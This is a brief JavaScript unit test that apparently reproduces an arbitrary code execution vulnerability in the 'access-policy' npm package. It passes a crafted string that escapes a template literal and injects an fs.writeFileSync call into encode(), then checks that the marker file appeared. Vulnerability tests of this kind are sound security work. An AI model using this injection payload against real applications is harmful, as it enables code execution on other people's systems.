test("Arbitrary code execution in access-policy", () => {
  expect.assertions(2);
  const fs = require("fs");
  let a = require("access-policy");
  const path = "./access-policy";
  let statements = "`; require(`fs`).writeFileSync(`" + path + "`,``);//";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    a.encode(statements, data);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
